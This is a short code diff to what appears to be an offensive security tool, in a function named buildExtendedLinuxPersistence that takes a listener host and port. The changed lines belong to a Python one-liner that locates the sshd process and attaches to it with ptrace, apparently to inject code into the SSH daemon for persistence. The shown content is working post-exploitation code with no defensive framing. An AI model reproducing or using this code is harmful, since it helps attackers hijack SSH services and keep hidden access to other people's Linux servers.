@@ -416,7 +416,7 @@ export function buildExtendedLinuxPersistence(lhost: string, lport: string, cmd:
       command: `python3 -c "
 import ctypes, sys, os
 PTRACE_ATTACH=16; PTRACE_DETACH=17; PTRACE_POKETEXT=4
-pid = int(open('/proc/\$(pgrep -x sshd | head -1)/status').read().split('\n')[0].split()[1])
+pid = int(__import__('subprocess').check_output(['pgrep','-x','sshd'],text=True).strip().split('\n')[0])
 libc = ctypes.CDLL('libc.so.6')
 libc.ptrace(PTRACE_ATTACH, pid, 0, 0)
 os.waitpid(pid, 0)
